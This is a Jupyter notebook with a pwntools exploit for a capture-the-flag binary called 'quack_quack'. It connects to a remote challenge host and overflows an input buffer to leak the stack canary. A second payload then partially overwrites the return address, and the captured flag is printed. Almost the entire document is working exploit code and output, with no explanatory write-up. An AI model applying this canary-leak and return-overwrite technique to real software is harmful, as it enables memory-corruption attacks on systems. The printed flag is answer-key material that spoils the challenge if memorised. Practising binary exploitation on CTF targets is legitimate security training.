{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to 94.237.58.86 on port 41120\n",
      "[x] Opening connection to 94.237.58.86 on port 41120: Trying 94.237.58.86\n",
      "[+] Opening connection to 94.237.58.86 on port 41120: Done\n",
      "b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQuack Quack A'\n",
      "Leaked Canary: b'\\x00\\x17\\xc7\\xe2\\x9dE\\x9c\\xb0'\n",
      "[x] Receiving all data\n",
      "[x] Receiving all data: 0B\n",
      "[x] Receiving all data: 118B\n",
      "[+] Receiving all data: Done (118B)\n",
      "[*] Closed connection to 94.237.58.86 port 41120\n",
      "b'Did you really expect to win a fight against a Duck?!\\n\\nHTB{~c4n4ry_g035_qu4ck_qu4ck~_52186b1fa71f2218e874277b7deb8e22}'\n"
     ]
    }
   ],
   "source": [
    "from pwn import *\n",
    "\n",
    "#p = process(\"./quack_quack\")\n",
    "p = remote(\"94.237.58.86\", \"41120\")\n",
    "\n",
    "a = b\"Quack Quack \"\n",
    "canary_address = b\"0x7fffffffd708\" # [rbp-0x8]\n",
    "# 0x00007fffffffd705\n",
    "# 0x64ec7212c433b400\n",
    "#gdb.attach(p)\n",
    "#input()\n",
    "\n",
    "#i = 4\n",
    "#payload = b\"A\" * (102 - 13 - i) + a + b\"A\"\n",
    "payload = b\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQuack Quack A\"\n",
    "print(payload)\n",
    "\n",
    "p.recvuntil(b\"Quack the Duck!\")\n",
    "p.send(payload)\n",
    "\n",
    "# newline\n",
    "p.recv()\n",
    "\n",
    "r = len(\", ready to fight the Duck?\\n\\n> \")\n",
    "l = len(\"Quack Quack \")\n",
    "\n",
    "unprocessed_canary = p.recv()[l:-r]\n",
    "canary = b\"\\x00\"+unprocessed_canary[:7]\n",
    "print(\"Leaked Canary:\", canary)\n",
    "\n",
    "\n",
    "\n",
    "payload2 = b\"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8A\" \\\n",
    "    + canary + b\"Ad2Ad3Ad\" +  b\"\\x83\\x13\"\n",
    "p.send(payload2)\n",
    "\n",
    "print(p.recvall())\n",
    "# p.interactive()\n",
    "\n",
    "#0x9341c2f99b1cc500"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv-py",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
